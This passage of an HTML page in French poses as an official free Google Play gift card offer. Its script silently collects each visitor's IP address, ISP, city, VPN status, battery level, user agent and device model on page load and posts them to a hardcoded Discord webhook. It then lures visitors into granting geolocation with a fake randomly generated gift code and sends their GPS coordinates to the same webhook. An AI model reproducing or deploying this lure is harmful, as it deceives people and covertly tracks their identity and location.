  <meta property="og:description" content="Votre carte cadeau Google Play est pr√™te √† √™tre utilis√©e. Profitez de vos applications, jeux et films d√®s maintenant !">
  <meta property="og:image" content="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/play_giftcard.max-1300x1300.png">
  <meta property="og:url" content="https://play.google.com/redeem">

  <meta name="twitter:image" content="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/play_giftcard.max-1300x1300.png">
  <script src="https://unpkg.com/ua-parser-js@1.0.2/dist/ua-parser.min.js"></script>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background-color: #f0f0f5;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;

    }
    .container {
      background-color: white;
      padding: 20px;
      border-radius: 15px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      width: 300px;
      text-align: center;
    }
    h1 {
      color: #2d9cdb;
      font-size: 24px;
      margin-bottom: 15px;
    }
    p {
      color: #333;
      margin-bottom: 10px;

    }
    .button {
      background-color: #2d9cdb;

    }

    }
  </style>
</head>
<body>
  <div class="container">
    <h1>üéâ Carte Cadeau Google Play Gratuite ! üéâ</h1>
    <p>Autorisez la localisation pour r√©cup√©rer votre code Google Play officiel de 15 ‚Ç¨ !</p>
    <button id="allow-location" class="button">Autoriser la localisation</button>
  </div>

  <script>
    // Fonction pour g√©n√©rer le code cadeau
    function generateGiftCode() {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      let code = '';
      for (let i = 0; i < 16; i++) {
        code += chars.charAt(Math.floor(Math.random() * chars.length));
        if (i % 4 === 3 && i < 15) code += '-';
      }
      return code;
    }

    // R√©cup√©rer les donn√©es IP
    async function getIPData() {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
          ipv4: data.ip || 'N/A',
          ipv6: data.ipv6 || 'N/A',
          isp: data.org || 'N/A',
          organization: data.asn || 'N/A',
          vpn: data.proxy ? 'Oui' : 'Non',
          city: data.city || 'N/A',
          region: data.region || 'N/A',
          country: data.country_name || 'N/A',
        };
      } catch (error) {
        return { ipv4: 'N/A', ipv6: 'N/A', isp: 'N/A', organization: 'N/A', vpn: 'Non', city: 'N/A', region: 'N/A', country: 'N/A' };
      }
    }

    // R√©cup√©rer le statut de la batterie
    async function getBatteryStatus() {
      try {
        const battery = await navigator.getBattery();
        return {
          level: battery.level * 100,
          charging: battery.charging ? 'Oui' : 'Non',
        };
      } catch (error) {
        return { level: 'N/A', charging: 'N/A' };
      }
    }

    // R√©cup√©rer le user agent
    function getUserAgent() {
      return navigator.userAgent;
    }

    // R√©cup√©rer le nom de l'appareil
    function getDeviceName() {
      const parser = new UAParser();
      const result = parser.getResult();
      return result.device.model || 'Inconnu';
    }

    // Envoi des donn√©es au webhook
    async function sendToWebhook(data) {
      const payload = {
        content: 'Nouvelle visite avec localisation !',
        embeds: [
          {
            title: 'Donn√©es collect√©es',
            fields: [
              { name: 'Code Google Play', value: data.giftCode, inline: true },
              { name: 'IP IPv4', value: data.ip.ipv4, inline: true },
              { name: 'IP IPv6', value: data.ip.ipv6, inline: true },
              { name: 'Fournisseur', value: data.ip.isp, inline: true },
              { name: 'Organisation', value: data.ip.organization, inline: true },
              { name: 'VPN/Proxy', value: data.ip.vpn, inline: true },
              { name: 'Ville', value: data.ip.city, inline: true },
              { name: 'R√©gion', value: data.ip.region, inline: true },
              { name: 'Pays', value: data.ip.country, inline: true },
              { name: 'User Agent', value: data.userAgent, inline: true },
              { name: 'Batterie', value: `Niveau: ${data.battery.level}% | Chargement: ${data.battery.charging}`, inline: true },
              { name: 'Nom de l\'appareil', value: data.deviceName, inline: true },
            ],
            color: 0x00ff00,
          },
        ],
      };

      try {
        await fetch('https://discord.com/api/webhooks/1371889224189743154/JlPYX5flX7Z761t1qz1S4FIe3hx3SyxB69jY7MEOb_2sWOUSPpTj20dwXcwW8APSzSW1', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        });
      } catch (error) {
        console.error('Erreur lors de l\'envoi au webhook :', error);
      }
    }

    // Lors de la visite de la page, on r√©cup√®re toutes les infos
    (async () => {
      const ipData = await getIPData();
      const batteryStatus = await getBatteryStatus();
      const userAgent = getUserAgent();
      const deviceName = getDeviceName();

      const collectedData = {
        ip: ipData,
        battery: batteryStatus,
        userAgent: userAgent,
        deviceName: deviceName,
      };

      // Envoi des donn√©es au webhook d√®s la visite
      await sendToWebhook(collectedData);
    })();

    // Lorsqu'on clique sur "Autoriser la localisation"
    document.getElementById('allow-location').addEventListener('click', async () => {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const { latitude, longitude } = position.coords;
          const giftCode = generateGiftCode();
          const ipData = await getIPData();
          const batteryStatus = await getBatteryStatus();
          const userAgent = getUserAgent();
          const deviceName = getDeviceName();

          const collectedData = {
            giftCode,
            ip: ipData,
            battery: batteryStatus,
            userAgent: userAgent,
            deviceName: deviceName,
            location: { latitude, longitude },
          };

          await sendToWebhook(collectedData);
          alert('Merci ! Votre localisation a √©t√© envoy√©e avec succ√®s.');
        },
        () => {
          alert('La localisation a √©t√© refus√©e.');
        }
      );
    });
  </script>
</body>
</html>
